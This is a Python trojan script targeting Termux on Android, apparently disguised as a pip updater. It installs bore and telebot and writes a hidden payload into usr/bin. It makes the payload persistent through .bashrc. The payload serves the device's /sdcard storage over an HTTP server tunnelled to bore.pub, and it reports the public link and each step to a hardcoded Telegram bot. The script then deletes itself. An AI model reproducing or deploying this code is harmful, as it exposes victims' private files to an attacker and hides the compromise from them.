import os, subprocess

sys.system("pkg install bore -y")
sys.system("pip install telebot")

import telebot

def sender(message):
	bot = telebot.TeleBot('8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo')
	bot.send_message(5867708857, message)

malicious = """
import os, random, subprocess, time, threading, telebot

subprocess.run("rm -r ~/pip_update", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)

def sender(message):
	bot = telebot.TeleBot('8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo')
	bot.send_message(5867708857, message)

def extract_url_from_text(text, process):
	words = text.split()
	if "yes" in words:
		process.stdin.write(b"yes")
		process.stdin.flush()
		return "yes found"
	else:
		for word in words:
			if word.startswith("bore.pub:"):
				return word
		return None

def open_ssh_connection():
	port = random.choice(range(1000, 10000))
	http_server_command = f"cd /sdcard/ && python3 -m http.server {port}"
	subprocess.Popen(http_server_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, start_new_session=True)
	time.sleep(5)
	ssh_command = f"bore local {port} --to bore.pub"
	process = subprocess.Popen(ssh_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, start_new_session=True)
	urll = None
	for line in iter(process.stdout.readline, b''):
		output = line.decode('utf-8').strip()
		print(output)
		urll = extract_url_from_text(output, process)
		if urll:
			break
	if urll:
		if "bore.pub" in urll:
			message = f"The service is online : {urll}"
			sender(message)
			while True:
				if process.poll() is not None:
					sender("Bore process terminated. Attempting to restart...")
					open_ssh_connection()
					break
				time.sleep(60)
		elif urll == "yes found":
			open_ssh_connection()
		elif urll == None:
			message = "☆ Failed to establish a connection."
			sender(message)
	else:
		message = "☆ Failed to establish a connection."
		sender(message)

open_ssh_connection()
"""

def install_malware():
	#creating python malware file
	with open(".python_config.py", "w") as c:
		for line in malicious:
			c.write(line)
	#creating sh file to run maleware
	with open(".wifi-status.sh", "w") as c:
		c.write("""#!/data/data/com.termux/files/usr/bin/bash
python ~/../usr/bin/.python_config.py >/dev/null 2>&1 &""")
	#adding malware to bashrc to run malware automatically
	bashrc_path = os.path.join(os.getenv('HOME'), '.bashrc')
	if os.path.exists(bashrc_path):
		with open(bashrc_path, "a") as b:
			b.write("\n.wifi-status.sh")
		message = "☆ bashcr is found and the command successfully wrote down in it."
		sender(message)
	else:
		with open(bashrc_path, "w") as b:
			b.write(".wifi-status.sh")
		message = "☆ bashcr is not found but i will create it and write down the command."
		sender(message)
	#moving files to bin
	#chmod sh file
	result = subprocess.run("mv .wifi-status.sh ~/../usr/bin/ && chmod +x ~/../usr/bin/.wifi-status.sh", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
	if result.returncode == 0:
		message = "☆ Sh file moved to bin seccessfully."
		sender(message)
		#moving python malware to bin
		result = subprocess.run("mv .python_config.py ~/../usr/bin/", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
		if result.returncode == 0:
			message = "☆ Malware moved to bin seccessfully."
			sender(message)
		#failed to move python makware
		else:
			message = "☆ Faild to move python malware file."
			sender(message)
			result = subprocess.run("rm .python_config.py", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
			#removing malware
			#success in removing malware
			if result.returncode == 0:
				message = "☆ Done removing malware."
				sender(message)
			#failed to remove malware
			else:
				message = "☆ Unable to remove malware."
				sender(message)
	#failed to move sh file
	else:
		message = "☆ Faild to move sh file."
		sender(message)
		result = subprocess.run("rm .wifi-status.sh .python_config.py", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
		#removing sh file and malware
		#success in removing malware
		if result.returncode == 0:
			message = "☆ Done removing malware."
			sender(message)
		#failed to remove malware
		else:
			message = "☆ Unable to remove malware."
			sender(message)

install_malware()


result = subprocess.run("rm update_pip.py", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
if result.returncode == 0:
	message = "☆ Done removing trojan."
	sender(message)
else:
	message = "☆ Unable to remove trojan."
	sender(message)

os.system('exit')
